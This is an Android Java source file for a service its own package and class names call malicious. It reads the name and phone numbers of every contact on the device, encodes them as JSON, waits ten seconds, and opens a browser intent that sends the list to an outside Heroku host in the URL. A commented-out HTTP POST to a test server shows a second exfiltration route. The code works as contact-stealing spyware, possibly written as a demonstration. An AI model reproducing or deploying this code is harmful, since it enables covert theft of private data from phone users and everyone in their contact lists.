package com.example.maliciouscontactlist;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.PowerManager;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.CommonDataKinds;
import android.util.Log;

import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

import static android.os.SystemClock.sleep;

/**
 * Created by Andrew on 9/22/13.
 */
public class MaliciousService extends IntentService {
    private static final String NAME = Statics.NAME + "(MALICIOUS)";
    // Defines the selection clause
    private static final String PHONE_SELECTION = CommonDataKinds.Phone.LOOKUP_KEY + " = ?";
    // Defines the array to hold the search criteria
    private String[] mSelectionArgs = { "" };

    public MaliciousService() {
        super("MaliciousService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {

        Log.i(NAME, "Malicious service handling intent...");
        List contactsList = new ArrayList<JSONObject>();

        final ContentResolver contentResolver = getContentResolver();
        final Cursor contactCursor = contentResolver.query(Contacts.CONTENT_URI, null, null, null, null);
        if (contactCursor != null && contactCursor.moveToFirst()) {
            do {
                final JSONObject contactObject = new JSONObject();
                try {
                    contactObject.put("display name", contactCursor.getString(contactCursor.getColumnIndex(Contacts.DISPLAY_NAME)));
                    mSelectionArgs[0] = contactCursor.getString(contactCursor.getColumnIndex(Contacts.LOOKUP_KEY));
                    final Cursor phonesCursor = contentResolver.query(CommonDataKinds.Phone.CONTENT_URI, null, PHONE_SELECTION, mSelectionArgs, null);
                    List phonesList = new ArrayList<JSONObject>();
                    if (phonesCursor != null && phonesCursor.moveToFirst()) {
                        do {
                            final String number = phonesCursor.getString(phonesCursor.getColumnIndex(CommonDataKinds.Phone.NUMBER));
                            final String type = getString(CommonDataKinds.Phone.getTypeLabelResource(phonesCursor.getInt(phonesCursor.getColumnIndex(CommonDataKinds.Phone.TYPE))));
                            phonesList.add(new Phone(type, number));
                        } while (phonesCursor.moveToNext());
                        phonesCursor.close();
                    }
                    contactObject.put("numbers", phonesList);
                    contactsList.add(contactObject);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            } while (contactCursor.moveToNext());
            contactCursor.close();
        }
        JSONArray contactListObject = new JSONArray(contactsList);
        Intent i = new Intent(Intent.ACTION_VIEW,
                Uri.parse("http://safe-meadow-1293.herokuapp.com/create?content=\""
                        + contactListObject.toString().replace('{','(').replace('}',')').replace("\"","").replace("\\","")
                        + "\""));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        sleep(10000);
        Log.i(NAME, contactListObject.toString().replace('{', '(').replace('}', ')').replace("\"", "").replace("\\", ""));
        startActivity(i);

//        HttpClient httpClient = new DefaultHttpClient();
//        HttpPost httpPost = new HttpPost("http://posttestserver.com/post.php?dir=at");
//        try {
//            httpPost.setEntity(new StringEntity(contactListObject.toString()));
//            httpPost.setHeader("Accept", "application/json");
//            httpPost.setHeader("Content-type", "application/json");
//        }
//        catch (final UnsupportedEncodingException e) {
//            Log.e(NAME, e.getMessage());
//        }
//        try {
//            Log.i(NAME, httpClient.execute(httpPost).toString());
//        }
//        catch (final ClientProtocolException e) {
//            Log.e(NAME, e.getMessage());
//        }
//        catch (final IOException e) {
//            Log.e(NAME, e.getMessage());
//        }
    }

    private class Phone extends JSONObject {
        public Phone(final String type, final String number) throws JSONException {
            super();
            this.put("type", type);
            this.put("number", number);
        }
    }
}
